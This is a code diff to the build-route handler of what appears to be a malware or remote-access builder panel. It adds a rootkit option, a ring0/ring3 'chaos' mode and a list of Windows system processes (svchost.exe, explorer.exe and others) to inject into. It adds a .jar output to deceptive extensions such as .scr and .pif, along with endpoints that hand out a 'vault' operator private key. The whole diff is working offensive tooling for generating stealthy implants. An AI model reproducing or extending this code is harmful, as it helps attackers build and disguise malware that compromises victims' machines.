@@ -8,6 +8,7 @@ import { logger } from "../../logger";
 import path from "path";
 import fs from "fs";
 import { resolveRuntimeRoot } from "../runtime-paths";
+import { resolveDataDir } from "../../paths";
 
 type RequestIpProvider = {
   requestIP: (req: Request) => { address?: string } | null | undefined;
@@ -76,6 +77,8 @@ export async function handleBuildRoutes(
         jarModId,
         enableR77,
         enableChaos,
+        chaosMode,
+        typhonProcess,
         requireAdmin,
         outputExtension,
         sleepSeconds,
@@ -169,7 +172,7 @@ export async function handleBuildRoutes(
         ? iconBase64
         : undefined;
       const safeRequireAdmin = !!requireAdmin;
-      const VALID_OUTPUT_EXTENSIONS = new Set([".exe", ".scr", ".bat", ".cmd", ".pif", ".com"]);
+      const VALID_OUTPUT_EXTENSIONS = new Set([".exe", ".scr", ".bat", ".cmd", ".pif", ".com", ".jar"]);
       const safeOutputExtension =
         typeof outputExtension === "string" && VALID_OUTPUT_EXTENSIONS.has(outputExtension.toLowerCase())
           ? outputExtension.toLowerCase() : ".exe";
@@ -181,6 +184,17 @@ export async function handleBuildRoutes(
         typeof typhonVariant === "string" && VALID_TYPHON_VARIANTS.has(typhonVariant.trim().toLowerCase())
           ? typhonVariant.trim().toLowerCase()
           : "1";
+      const VALID_TYPHON_PROCESSES = new Set([
+        "notepad.exe", "conhost.exe", "explorer.exe", "svchost.exe",
+        "dllhost.exe", "cmd.exe", "powershell.exe", "msiexec.exe",
+        "werfault.exe", "runtimebroker.exe", "searchhost.exe",
+      ]);
+      const safeTyphonProcess = typeof typhonProcess === "string"
+        && VALID_TYPHON_PROCESSES.has(typhonProcess.toLowerCase().trim())
+        ? typhonProcess.toLowerCase().trim() : undefined;
+      const safeChaosMode = typeof chaosMode === "string"
+        && (["both", "ring0", "ring3"] as const).includes(chaosMode.toLowerCase() as any)
+        ? (chaosMode.toLowerCase() as "both" | "ring0" | "ring3") : "both";
 
       const MAX_BOUND_FILES = 5;
       const MAX_BOUND_FILE_BYTES = 10 * 1024 * 1024;
@@ -276,6 +290,8 @@ export async function handleBuildRoutes(
           : undefined,
         enableR77: !!enableR77,
         enableChaos: !!enableChaos,
+        chaosMode: !!enableChaos ? safeChaosMode : undefined,
+        typhonProcess: !!enableTyphon ? safeTyphonProcess : undefined,
         requireAdmin: safeRequireAdmin,
         outputExtension: safeOutputExtension,
         sleepSeconds: safeSleepSeconds,
@@ -469,6 +485,41 @@ export async function handleBuildRoutes(
         headers: {
           "Content-Type": "application/octet-stream",
           "Content-Disposition": `attachment; filename="${fileName}"`,
+        },
+      });
+    }
+
+    // ── Vault keypair management ─────────────────────────────────────────────
+
+    if (req.method === "GET" && url.pathname === "/api/build/vault/status") {
+      requirePermission(user, "clients:build");
+      const toolsDir = path.join(resolveDataDir(), "tools");
+      const keyPath = path.join(toolsDir, "vault-operator-key");
+      const pubKeyPath = keyPath + ".pub";
+      const hasPrivateKey = fs.existsSync(keyPath);
+      const hasPublicKey = fs.existsSync(pubKeyPath);
+      let publicKey: string | null = null;
+      if (hasPublicKey) {
+        try { publicKey = fs.readFileSync(pubKeyPath, "utf-8").trim(); } catch {}
+      }
+      return Response.json({ hasKeypair: hasPrivateKey && hasPublicKey, hasPrivateKey, hasPublicKey, publicKey });
+    }
+
+    if (req.method === "GET" && url.pathname === "/api/build/vault/private-key") {
+      if (user.role !== "admin") {
+        return new Response("Forbidden: Admin only", { status: 403 });
+      }
+      const keyPath = path.join(resolveDataDir(), "tools", "vault-operator-key");
+      if (!fs.existsSync(keyPath)) {
+        return new Response("Not Found: No vault keypair generated yet. Run a vault-enabled build first.", { status: 404 });
+      }
+      const keyData = fs.readFileSync(keyPath);
+      const ip = server.requestIP(req)?.address || "unknown";
+      logAudit({ timestamp: Date.now(), username: user.username, ip, action: AuditAction.COMMAND, details: "Downloaded vault private key", success: true });
+      return new Response(keyData, {
+        headers: {
+          "Content-Type": "application/octet-stream",
+          "Content-Disposition": 'attachment; filename="vault-operator-key"',
         },
       });
     }
